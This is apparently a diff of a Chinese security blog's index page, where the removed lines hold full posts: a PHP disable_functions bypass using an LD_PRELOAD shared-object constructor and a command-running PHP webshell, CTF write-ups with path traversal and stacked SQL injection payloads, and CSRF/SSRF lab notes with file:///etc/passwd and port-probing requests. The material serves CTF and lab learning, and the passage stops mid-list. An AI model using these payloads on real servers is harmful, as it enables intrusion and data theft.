-<p>通过查找了解到，GCC 有个 C 语言扩展修饰符__attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 __attribute__((constructor)) 修饰的函数。即，我们<strong>不局限于仅劫持某一函数，而应考虑劫持共享对象</strong>。</p>
-<p>修改代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">evil</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;pwned!&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">exec</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    evil();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>编译，<code>gcc -shared -fPIC evil.c -o evil.so -w</code></p>
-<p>随后php mail.php， 发现成功输出<code>pwned!</code>。</p>
-<blockquote>
-<p>最终php文件代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="comment">// bypass_disable_functions.php</span></span><br><span class="line">&gt;<span class="meta">&lt;?php</span> </span><br><span class="line">$cmd=$_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">$out_path=$_GET[<span class="string">&#x27;outpath&#x27;</span>];</span><br><span class="line">$evil_cmdline=$cmd . <span class="string">&quot; &gt; &quot;</span> . $outpath .<span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; cmdline: &quot;</span> . $evil_cmdline . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">putenv(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">$so_path=$_GET[<span class="string">&#x27;sopath&#x27;</span>];</span><br><span class="line">putenv(<span class="string">&quot;LD_PRELOAD=&quot;</span> . $so_path);</span><br><span class="line"></span><br><span class="line">error_log(<span class="string">&quot;啊哈哈哈哈!&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; output:&quot;</span> . nl2br(file_get_contents($out_path)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">unlink($out_path);</span><br><span class="line">&gt;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>c程序代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="comment">// evil.c</span></span><br><span class="line"></span><br><span class="line">&gt;<span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line">&gt;<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">&gt;<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">&gt;<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">&gt;<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">&gt;<span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"></span><br><span class="line">&gt;__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">exec</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">       <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">&quot;EVIL_CMDLINE&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">int</span> i;</span><br><span class="line">       <span class="keyword">for</span>(i = <span class="number">0</span>; environ[i]; i++)&#123;</span><br><span class="line">               <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">&quot;LD_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">                       environ[i][<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       system(cmdline);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>将evil.c编译成evil.so上传服务器。</p>
-<p>payload:bypass_disable_functions.php?cmd=env&amp;outpath=/var/www/html/res.txt&amp;sopath=/var/www/html/evil.so</p>
-</blockquote>
-<p>第三种借助蚁剑的插件实现bypass。</p>
-
+          <p>萌新计划emmm….感觉前面算萌新后面就不萌了呢。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/08/28/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -440,7 +345,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2020-08-28 10:49:46 / Modified: 10:49:59" itemprop="dateCreated datePublished" datetime="2020-08-28T10:49:46+08:00">2020-08-28</time>
+              <time title="Created: 2020-08-28 10:49:46 / Modified: 13:45:29" itemprop="dateCreated datePublished" datetime="2020-08-28T10:49:46+08:00">2020-08-28</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -467,41 +372,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="2020-7-13-buu刷题记录1"><a href="#2020-7-13-buu刷题记录1" class="headerlink" title="2020-7-13-buu刷题记录1"></a>2020-7-13-buu刷题记录1</h2><p>(吐槽一波，由于这些题曾经做过这次是第二次做，浏览器智能得还留着我上一次操作的payload，导致我输入的时候payload直接就弹出来了/捂脸)</p>
-<h3 id="0x01-HCTF-2018-Warm-Up"><a href="#0x01-HCTF-2018-Warm-Up" class="headerlink" title="0x01 [HCTF 2018] Warm Up"></a>0x01 [HCTF 2018] Warm Up</h3><p>这个题考察CVE-2018-12613。拿到题目，f12发现给了source.php。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>审计代码发现有两个文件，其中hint.php提示了flag的位置，source.php就是源代码。其他文件的话都会返回<code>you can&#39;t see it</code>。但是仔细审计代码发现<code>$_page = mb_substr($page,0,mb_strpos($page . &#39;?&#39;, &#39;?&#39;));</code>这段代码存在逻辑漏洞，只需要在这两个满足白名单的文件后面加个<code>?</code>后就可以绕过了。</p>
-<p>故构造如下payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg.php</span><br></pre></td></tr></table></figure>
-
-<p>成功获得flag。</p>
-<h3 id="0x02-强网杯-2019-随便注"><a href="#0x02-强网杯-2019-随便注" class="headerlink" title="0x02 [强网杯 2019] 随便注"></a>0x02 [强网杯 2019] 随便注</h3><p>这个题考察堆叠注入。先测试<code>1&#39; or 1=1 #</code>发现可以正常返回，可以知道是单引号闭合，随后尝试union select注入发现被过滤且无法绕过。但是发现这里可以进行堆叠注入。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">show</span> <span class="keyword">databases</span>; <span class="comment">#   # 查看数据库</span></span><br><span class="line">1&#x27;;<span class="keyword">show</span> <span class="keyword">tables</span>; <span class="comment">#      # 查看数据表</span></span><br><span class="line">1&#x27;;<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`words`</span> <span class="comment">#     # 查看words表中的所有列名</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;;show columns from `1919810931114514` #    # 查看该表中的所有列名</span></span><br></pre></td></tr></table></figure>
-
-<p>随后发现在1919810931114514表中存在flag，但我们查询的是words表。故尝试修改表名来完成查询。修改words表为words1，1919810931114514表为words，然后修改列名，然后在输入万能密码查询就能得到flag了。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`words`</span> <span class="keyword">to</span> <span class="string">`words1`</span>;<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`191910931114514`</span> <span class="keyword">to</span> <span class="string">`words`</span>;<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`words`</span> <span class="keyword">change</span> <span class="string">`flag`</span> <span class="string">`id`</span> <span class="built_in">varchar</span>(<span class="number">100</span>); <span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p>不过这个题还有其他做法，可以通过mysql特有的handler语句完成查询。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;handler &#96;1919810931114514&#96; open;handler &#96;1919810931114514&#96; read first; #    #如果没读出来就handler &#96;1919810931114514 read next;一直往下读，读到flag为止。</span><br></pre></td></tr></table></figure>
-
-<p>或者通过预处理：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">sEt</span> a=<span class="keyword">CONCAT</span>(<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;lect * from `1919810931114514`;&#x27;</span>);<span class="keyword">prePare</span> flag <span class="keyword">from</span> a;<span class="keyword">execute</span> flag; <span class="comment">#    # set和prepare被过滤了，不过这个可以通过大小写绕过</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="0x03-SUCTF-2019-EasySQL"><a href="#0x03-SUCTF-2019-EasySQL" class="headerlink" title="0x03 [SUCTF 2019] EasySQL"></a>0x03 [SUCTF 2019] EasySQL</h3><p>这个题也是堆叠注入，但是handler被过滤，且被限制了40位。前面的方法无法再使用了。测试一下发现，输入1，2，3等数字返回1，输入0或者非数字什么都不返回。猜测使用了||。然后发现通过修改sql_mode系统变量可以改变||的功能，把||的功能从运算符变成字符串拼接符。</p>
-<blockquote>
-<p>sql_mode可以设置的值有：ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,PIPES_AS_CONCAT,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION</p>
-</blockquote>
-<p>sql_mode主要关注两个值，PIPES_AS_CONCAT即将||当作字符串拼接符，STRICT_TRANS_TABLES即将||当作逻辑或运算符。</p>
-<p>ok接下来就简单了。将sql_mode设置成PIPES_AS_CONCAT，然后查询就完事。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span>; <span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>一个非预期。这个题没有过滤<em>，故可以直接\</em>,1，这样sql语句就变成了<code>select *,1||flag from Flag</code>，也就是<code>select *,1 from Flag</code>。直接查询flag表所有内容。</p>
-</blockquote>
-<h3 id="0x04-极客大挑战-2019-EasySQL"><a href="#0x04-极客大挑战-2019-EasySQL" class="headerlink" title="0x04 [极客大挑战 2019] EasySQL"></a>0x04 [极客大挑战 2019] EasySQL</h3><p>万能密码登录即可。</p>
-<h3 id="0x05-GYCTF-2020-Blacklist"><a href="#0x05-GYCTF-2020-Blacklist" class="headerlink" title="0x05 [GYCTF 2020] Blacklist"></a>0x05 [GYCTF 2020] Blacklist</h3><p>这个题set alter被过滤了且无法绕过，于是就只剩下使用handler进行查询的方法了。payload和强网杯那个一样，不再赘述。</p>
-
+          <p>(吐槽一波，由于这些题曾经做过这次是第二次做，浏览器智能得还留着我上一次操作的payload，导致我输入的时候payload直接就弹出来了/捂脸)</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/08/28/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -545,7 +424,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2020-08-28 10:48:41 / Modified: 10:49:05" itemprop="dateCreated datePublished" datetime="2020-08-28T10:48:41+08:00">2020-08-28</time>
+              <time title="Created: 2020-08-28 10:48:41 / Modified: 13:45:25" itemprop="dateCreated datePublished" datetime="2020-08-28T10:48:41+08:00">2020-08-28</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -572,123 +451,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="csrf-amp-ssrf-amp-session伪造问题"><a href="#csrf-amp-ssrf-amp-session伪造问题" class="headerlink" title="csrf&amp;ssrf&amp;session伪造问题"></a>csrf&amp;ssrf&amp;session伪造问题</h2><p>今天学习的内容是csrf，ssrf，session伪造这三个内容。复现平台dvwa&amp;pikachu。</p>
-<h3 id="0x01-csrf"><a href="#0x01-csrf" class="headerlink" title="0x01 csrf"></a>0x01 csrf</h3><p>跨站请求伪造（Cross-site request forgery），也被称为one-click attack 或者session riding，通常缩写为CSRF 或者XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</p>
-<p>实施 CSRF 攻击，必须满足以下三个条件</p>
-<ol>
-<li><strong>攻击者能执行相关的流程。</strong></li>
-<li><strong>基于 Cookie 的会话机制.</strong></li>
-<li><strong>没有不可预测的成分.</strong></li>
-</ol>
-<p>一些常见的 CSRF 产生原因：</p>
-<ol>
-<li>仅从 HTTP 请求格式来选择性验证 Token. 比如对于 POST 型请求进行 Token 验证，但忽略 GET 型.</li>
-<li>仅对出现的 Token 进行验证，若请求中忽略了 Token，则不校验.</li>
-<li>Token 没有和 Session 对应起来. 也就是其他用户的 Token 可以用于该用户建立的 Session 中，攻击者可以用自己的 Session 自己获取一个合法 Token，然后将其用于攻击.</li>
-<li>CSRF 与非 Session 的 Cookie 关联，相当于也没有与 Session 挂钩.</li>
-<li>CSRF 出现在 Cookie 中.</li>
-<li>仅仅依靠 <code>Referer</code> 来应对 CSRF，判断用户是不是从相同网站跳转来.</li>
-</ol>
-<h4 id="靶场Pikachu"><a href="#靶场Pikachu" class="headerlink" title="靶场Pikachu"></a>靶场Pikachu</h4><h5 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h5><p>登录后点击修改发现url上出现修改链接，那么只需要点击这个链接，内容就会被瞬间修改。</p>
-<h5 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h5><p>登录后点击修改抓包发现跟GET无区别，那么只需要一个钓鱼网站，信息即可全部被修改。</p>
-<h5 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h5><p>这次用了token，不能再直接操作了，需要靠xss等方式来获取token。</p>
-<h4 id="靶场DVWA"><a href="#靶场DVWA" class="headerlink" title="靶场DVWA"></a>靶场DVWA</h4><h5 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h5><p>点击修改密码发现信息在url中出现，那么只需要点击这个url，密码直接被修改。</p>
-<h5 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h5><p>审计代码发现检查了HTTP_REFERER是否包含SERVER_NAME，Referer修改成服务器就绕过了。</p>
-<h5 id="High"><a href="#High" class="headerlink" title="High"></a>High</h5><p>这次有了user_token，token正确才可以修改密码，但是依然是没有验证用户是否直到原来的密码，如果我们通过xss等方式得到了token，那么验证也就失效了。(注意提交的时候依然使用的是GET请求，存在信息泄露隐患)。</p>
-<h5 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h5><p>注意到这次表单多了一项当前密码，增大的攻击者的难度：哪怕得到一个可用的 Token，还需进一步拿到用户的密码才能修改。</p>
-<h4 id="CSRF-的防御"><a href="#CSRF-的防御" class="headerlink" title="CSRF 的防御"></a>CSRF 的防御</h4><p>目前最好的方法就是使用 CSRF Token. 但是要求<strong>安全</strong>地生成 Token 并且<strong>正确</strong>地使用.</p>
-<p>这意味着，产生 Token 时:</p>
-<ol>
-<li>随机数发生器必须达到足够的安全性，并且不会重复生成/使用相同的随机值，生成的随机数不能被预测. 推荐 <code>PRNG</code>.</li>
-<li>使用的 Hash 算法必须够强，不能是 <code>MD5</code> 等安全性较差的 Hash 算法.</li>
-</ol>
-<p>传输和使用 Token 时需要注意的是： </p>
-<ol>
-<li>尽量使用 POST 方法. 使用 GET 方法会导致: - Token 会被记录 - Token 可能传输到 HTTP Referer 的第三方服务器. - Token 可以在浏览器的地址栏中被显示. </li>
-<li>Token 不应通过 Cookie 传输.</li>
-<li>Token 必须趁早放置在 HTML 中，并且设置为 <code>hidden</code>.</li>
-</ol>
-<p>还可以通过验证码来强制交互。</p>
-<h3 id="0x02-SSRF"><a href="#0x02-SSRF" class="headerlink" title="0x02 SSRF"></a>0x02 SSRF</h3><blockquote>
-<p>服务器端请求伪造 (Server-Side Request Forgery, SSRF)</p>
-<p>其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据.</p>
-<p>比如可以突破防火墙，搞一些代理之类的；也可以向服务器发起请求，绕开 CDN 找到真实 IP.</p>
-</blockquote>
-<p>PHP 中一些容易引发 SSRF 工具的函数:</p>
-<ol>
-<li><code>file_get_contents()</code></li>
-<li><code>fsockopen()</code></li>
-<li><code>curl_exec()</code></li>
-</ol>
-<h4 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h4><p>打开页面，点击链接发现url处有个url参数明显有问题，改个路径试试：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;https:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure>
-
-<p>发现页面被正常渲染显示。随后尝试文件协议：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
-
-<p>发现成功读取。。。</p>
-<blockquote>
-<p>curl支持的协议有：</p>
-<p>dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp</p>
-<p>其中最主要的几个：</p>
-<ol>
-<li><code>file://</code> 随便读取文件</li>
-<li><code>dict://</code> 扫描端口</li>
-<li><code>gopher://</code> 万金油协议，危害最大.</li>
-<li><code>telnet://</code> 连接主机</li>
-</ol>
-</blockquote>
-<blockquote>
-<p>参考文献:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 利用file协议查看文件</span><br><span class="line">curl -v &#39;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;</span><br><span class="line"></span><br><span class="line"># 利用dict探测端口</span><br><span class="line">curl -v &#39;dict:&#x2F;&#x2F;127.0.0.1:22&#39;</span><br><span class="line">curl -v &#39;dict:&#x2F;&#x2F;127.0.0.1:6379&#x2F;info&#39;</span><br><span class="line"></span><br><span class="line"># Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET,POST 请求。这极大拓宽了 SSRF 的攻击面。例如，利用gopher协议反弹shell。</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h4><p>跟上一个同理，url处可以随意构造。这里使用了file_get_contents()，故可以使用php伪协议，例如将/etc/passwd的内容输出：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8081&#x2F;vul&#x2F;ssrf&#x2F;ssrf_fgc.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
-
-<p>成功读取，base64解码即可。</p>
-<h4 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h4><p>fsockopen的作用主要是与对端服务器建立socket连接。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params">$host,$port,$link</span>) </span>&#123;</span><br><span class="line">    $fp = fsockopen($host, intval($port), $errno, $errstr, <span class="number">30</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$fp) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;$errstr (error number $errno) \n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $out = <span class="string">&quot;GET $link HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">        $out .= <span class="string">&quot;Host: $host\r\n&quot;</span>;</span><br><span class="line">        $out .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">        $out .= <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">        fwrite($fp, $out);</span><br><span class="line">        $contents=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span> (!feof($fp)) &#123;</span><br><span class="line">            $contents.= fgets($fp, <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);</span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>这段代码使用 fsockopen 函数实现获取用户制定 URL 的数据（文件或者 HTML）。这个函数会使用 socket 跟服务器建立 TCP 连接，传输原始数据。</p>
-</blockquote>
-<p>最简单的应用可以设置 DNS log 绕过 CDN 看真实 IP.</p>
-<h4 id="防范-SSRF-的一些手段"><a href="#防范-SSRF-的一些手段" class="headerlink" title="防范 SSRF 的一些手段"></a>防范 SSRF 的一些手段</h4><ol>
-<li>服务器开启 OpenSSL 无法进行交互利用</li>
